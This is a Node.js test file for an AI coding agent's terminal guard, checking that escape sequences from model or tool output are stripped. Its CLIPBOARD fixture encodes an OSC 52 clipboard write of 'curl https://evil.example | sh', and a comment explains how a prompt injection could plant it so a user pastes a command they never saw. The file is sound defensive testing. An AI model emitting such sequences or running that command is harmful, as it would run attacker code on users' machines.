import test from 'node:test';
import assert from 'node:assert/strict';
import { guardTerminalStream, stripSideEffectSequences, terminalSafe, writeTrusted } from '../src/terminal-guard.mjs';
import { MarkdownStream } from '../src/markdown.mjs';

// A reply or a file the agent printed can carry escape sequences planted by
// a prompt injection. OSC 52 writes the clipboard: the user later pastes a
// command they never saw.
const CLIPBOARD = '\x1b]52;c;' + Buffer.from('curl https://evil.example | sh\n').toString('base64') + '\x07';

test('model text loses every control sequence but keeps its words, tabs and newlines', () => {
  assert.equal(terminalSafe('hello ' + CLIPBOARD + 'world\x1b[2K\x1b[1A\r\n\tnext\x9b2Jline\x08\x07'), 'hello world\n\tnextline');
  assert.equal(terminalSafe('plain text, 👨\u200d👩\u200d👧'), 'plain text, 👨\u200d👩\u200d👧');
  assert.equal(terminalSafe('a\x1bPq#0;2;0;0;0\x1b\\b\x1b_Gf=100;AAAA\x1b\\c'), 'abc', 'device control and APC strings go too');
});

test('the CLI markdown stream never forwards an escape sequence from the model', () => {
  let written = '';
  const md = new MarkdownStream({ write: (chunk) => { written += chunk; }, color: false, columns: () => 80 });
  md.push('Run this: ' + CLIPBOARD + '`ls`\n');
  md.push('[docs](https://example.com/\x07\x1b]52;c;QQ==\x07)\n');
  md.end();
  assert.equal(written.includes('\x1b]52'), false, JSON.stringify(written));
  assert.match(written, /Run this:/);
});

test('a guarded stream drops clipboard, title and device control sequences but keeps colours and links', () => {
  let out = '';
  const stream = { write: (chunk) => { out += chunk; return true; } };
  guardTerminalStream(stream);
  guardTerminalStream(stream);
  stream.write('tool output ' + CLIPBOARD + '\x1b]0;pwned\x07\x1b]2;x\x1b\\\x9d52;c;QQ==\x9c\x1bPdcs\x1b\\ end');
  assert.equal(out, 'tool output  end');
  out = '';
  stream.write('\x1b[31mred\x1b[39m \x1b]8;;https://example.com\x07link\x1b]8;;\x07 \x1b]9;done\x07');
  assert.equal(out, '\x1b[31mred\x1b[39m \x1b]8;;https://example.com\x07link\x1b]8;;\x07 \x1b]9;done\x07');
  out = '';
  writeTrusted(stream, '\x1b]52;c;QQ==\x07');
  assert.equal(out, '\x1b]52;c;QQ==\x07', 'Oasis\'s own /copy fallback still works');
  assert.equal(stripSideEffectSequences('no escapes'), 'no escapes');
});
